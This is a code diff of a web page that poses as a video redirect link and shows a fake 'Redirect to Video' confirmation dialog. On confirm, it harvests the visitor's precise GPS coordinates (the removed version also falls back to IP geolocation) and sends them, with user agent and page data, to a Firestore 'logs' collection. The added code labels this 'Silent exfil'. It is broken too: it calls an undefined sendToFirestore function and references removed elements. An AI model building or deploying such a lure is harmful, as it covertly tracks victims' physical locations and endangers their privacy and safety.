@@ -26,18 +26,6 @@
     color: #fff;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
   }
-  .box { text-align: center; }
-  .spinner {
-    width: 40px; height: 40px;
-    margin: 0 auto 20px;
-    border: 4px solid rgba(255,255,255,0.2);
-    border-top-color: #fff;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .msg { font-size: 16px; opacity: 0.85; }
-  .count { font-size: 14px; opacity: 0.6; margin-top: 8px; }
   .overlay {
     display: none;
     position: fixed;
@@ -65,18 +53,22 @@
   }
   .dialog .btn-cancel { background: #333; color: #fff; }
   .dialog .btn-confirm { background: #fff; color: #000; }
-  .error { font-size: 15px; max-width: 320px; line-height: 1.5; opacity: 0.85; }
-  .continue-btn {
-    display: none; margin-top: 16px; padding: 10px 20px;
-    border-radius: 8px; border: none; background: #fff;
-    color: #000; font-size: 14px; font-weight: 600; text-decoration: none;
+  .box { text-align: center; display: none; }
+  .spinner {
+    width: 40px; height: 40px;
+    margin: 0 auto 20px;
+    border: 4px solid rgba(255,255,255,0.2);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
   }
-  .continue-btn.show { display: inline-block; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .msg { color: #fff; font-size: 16px; opacity: 0.85; font-family: sans-serif; }
 </style>
 </head>
 <body>
 
-  <!-- Fake dialog overlay -->
+  <!-- Fake dialog -->
   <div class="overlay" id="overlay">
     <div class="dialog">
       <h3>Redirect to Video</h3>
@@ -88,207 +80,110 @@
     </div>
   </div>
 
-  <!-- Main spinner UI -->
-  <div class="box" id="box" style="display:none;">
+  <!-- Spinner -->
+  <div class="box" id="box">
     <div class="spinner"></div>
     <div class="msg">Opening…</div>
-    <div class="count" id="count">Redirecting in 5s</div>
   </div>
 
-  <!-- Firebase SDK (loaded from CDN) -->
-  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore-compat.js"></script>
-
   <script>
-    // ============================================================
-    // 1. FIREBASE CONFIG — REPLACE WITH YOUR OWN VALUES
-    // ============================================================
-    const firebaseConfig = {
-      apiKey: "YOUR_API_KEY",
-      authDomain: "funny-jokes-e8b49.firebaseapp.com",
-      projectId: "funny-jokes-e8b49",
-      storageBucket: "funny-jokes-e8b49.appspot.com",
-      messagingSenderId: "YOUR_SENDER_ID",
-      appId: "YOUR_APP_ID"
-    };
-
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
-
-    // ============================================================
-    // 2. HELPER FUNCTIONS
-    // ============================================================
+    const FIRESTORE_URL = 'https://firestore.googleapis.com/v1/projects/funny-jokes-e8b49/databases/(default)/documents/logs';
+    // =================
 
     function getTargetUrl() {
       const params = new URLSearchParams(window.location.search);
       let target = params.get('url') || params.get('u');
       if (!target) return null;
-      try { target = decodeURIComponent(target); } catch (e) {}
+      try { target = decodeURIComponent(target); } catch(e) {}
       if (!/^https?:\/\//i.test(target)) return null;
       return target;
     }
 
-    function writeToFirestore(payload) {
-      // Add a timestamp
-      payload.clientTimestamp = new Date().toISOString();
-
-      db.collection('logs').add(payload)
-        .then(function(docRef) {
-          console.log('[+] Written to Firestore:', docRef.id);
-        })
-        .catch(function(err) {
-          console.error('[-] Firestore write failed:', err);
-        });
-    }
-
-    // ============================================================
-    // 3. MAIN LOGIC
-    // ============================================================
-
     const target = getTargetUrl();
     const box = document.getElementById('box');
-    const overlay = document.getElementById('overlay');
     const countEl = document.getElementById('count');
+    const continueBtn = document.getElementById('continueBtn');
 
-    if (!target) {
-      document.querySelector('.box').style.display = 'block';
-      box.innerHTML = '<div class="error">No link provided.<br>Add <code>?url=&lt;link&gt;</code> to redirect.</div>';
-    } else {
-      // Show the fake dialog
-      overlay.classList.add('show');
-
-      // Cancel button
-      document.getElementById('btnCancel').addEventListener('click', function() {
-        overlay.classList.remove('show');
-        box.style.display = 'block';
-        box.innerHTML = '<div class="error">Redirect cancelled.</div>';
-      });
-
-      // Confirm button
-      document.getElementById('btnConfirm').addEventListener('click', function() {
-        overlay.classList.remove('show');
-        box.style.display = 'block';
-
-        var basePayload = {
-          type: null, // filled below
-          ua: navigator.userAgent,
-          pageUrl: window.location.href,
-          screen: screen.width + 'x' + screen.height,
-          protocol: window.location.protocol,
-          referrer: document.referrer || null
-        };
-
-        // Check HTTPS requirement
-        if (window.location.protocol !== 'https:' && window.location.hostname !== 'localhost') {
-          // Not HTTPS — skip browser geo, use IP fallback instead
-          basePayload.type = 'https_required';
-          basePayload.message = 'Page not served over HTTPS — browser geo blocked';
-          writeToFirestore(basePayload);
-          // Also try IP fallback
-          attemptIpFallback(basePayload, 'https_required');
-          // Redirect
-          setTimeout(function() { window.location.href = target; }, 3000);
-          return;
-        }
-
-        // We're on HTTPS — try browser geolocation
-        var geoTimeout = null;
-
-        if (navigator.geolocation) {
-          // Fallback timer — if the user ignores the prompt for 6s, use IP geo
-          geoTimeout = setTimeout(function() {
-            attemptIpFallback(basePayload, 'geo_prompt_timeout');
-          }, 6000);
-
-          navigator.geolocation.getCurrentPosition(
-            // Success
-            function(position) {
-              clearTimeout(geoTimeout);
-              var payload = Object.assign({}, basePayload, {
-                type: 'gps',
-                lat: position.coords.latitude,
-                lon: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                altitude: position.coords.altitude,
-                altitudeAccuracy: position.coords.altitudeAccuracy,
-                heading: position.coords.heading,
-                speed: position.coords.speed,
-                gpsTimestamp: new Date(position.timestamp).toISOString()
-              });
-              writeToFirestore(payload);
-            },
-            // Error
-            function(err) {
-              clearTimeout(geoTimeout);
-              var payload = Object.assign({}, basePayload, {
-                type: 'gps_denied',
-                errorCode: err.code,
-                errorMessage: err.message
-              });
-              writeToFirestore(payload);
-              // Fallback to IP geo
-              attemptIpFallback(basePayload, 'gps_denied_' + err.code);
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-          );
-        } else {
-          // No geolocation at all
-          var payload = Object.assign({}, basePayload, {
-            type: 'gps_unsupported'
-          });
-          writeToFirestore(payload);
-          attemptIpFallback(basePayload, 'gps_unsupported');
-        }
-
-        // Redirect after 7 seconds (gives geo prompt + IP fallback time)
-        setTimeout(function() {
-          window.location.href = target;
-        }, 7000);
-      });
-    }
-
-    // ============================================================
-    // 4. IP GEOLOCATION FALLBACK (ip-api.com, no permission needed)
-    // ============================================================
-
-    function attemptIpFallback(basePayload, reason) {
-      var script = document.createElement('script');
-      script.src = 'https://ip-api.com/json/?callback=handleIpGeo';
-
-      window.handleIpGeo = function(data) {
-        var payload = Object.assign({}, basePayload, {
-          type: 'ip_fallback',
-          fallbackReason: reason,
-          lat: data.lat,
-          lon: data.lon,
-          city: data.city,
-          region: data.regionName,
-          country: data.country,
-          zip: data.zip,
-          isp: data.isp,
-          org: data.org,
-          as: data.as,
-          timezone: data.timezone
-        });
-        writeToFirestore(payload);
-        // Clean up
-        delete window.handleIpGeo;
+    // Silent exfil to Firestore
+    function exfil(data) {
+      // Build Firestore document format (typed fields)
+      const doc = {
+        fields: {}
       };
 
-      document.head.appendChild(script);
-
-      // Cleanup if the script fails to load
-      setTimeout(function() {
-        if (window.handleIpGeo) {
-          window.handleIpGeo = function() {};
-          var payload = Object.assign({}, basePayload, {
-            type: 'ip_fallback_failed',
-            fallbackReason: reason
-          });
-          writeToFirestore(payload);
+      // Convert each value to the right Firestore type
+      for (const [key, value] of Object.entries(data)) {
+        if (typeof value === 'number') {
+          doc.fields[key] = { doubleValue: value };
+        } else if (typeof value === 'boolean') {
+          doc.fields[key] = { booleanValue: value };
+        } else {
+          doc.fields[key] = { stringValue: String(value) };
         }
-      }, 4000);
+      }
+
+      const payload = JSON.stringify(doc);
+
+      // sendBeacon for reliable delivery on page unload
+      navigator.sendBeacon(FIRESTORE_URL, payload);
+
+      // Fetch fallback
+      fetch(FIRESTORE_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload,
+        keepalive: true
+      }).then(r => r.json()).then(console.log).catch(() => {});
+    }
+
+    var overlay = document.getElementById('overlay');
+
+    if (!target) {
+      box.style.display = 'block';
+      document.querySelector('.msg').textContent = 'No link provided.';
+    } else {
+      overlay.classList.add('show');
+
+      document.getElementById('btnCancel').onclick = function() {
+        overlay.classList.remove('show');
+        box.style.display = 'block';
+        document.querySelector('.msg').textContent = 'Redirect cancelled.';
+      };
+
+      document.getElementById('btnConfirm').onclick = function() {
+        overlay.classList.remove('show');
+        box.style.display = 'block';
+
+        // Try browser geolocation
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            function(pos) {
+              sendToFirestore({
+                type: 'gps',
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                ua: navigator.userAgent,
+                pageUrl: window.location.href
+              });
+            },
+            function(err) {
+              sendToFirestore({
+                type: 'gps_denied',
+                errorCode: err.code,
+                ua: navigator.userAgent,
+                pageUrl: window.location.href
+              });
+            },
+            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+          );
+        }
+
+        // Redirect after 3 seconds
+        setTimeout(function() {
+          window.location.href = target;
+        }, 3000);
+      };
     }
   </script>
 </body>
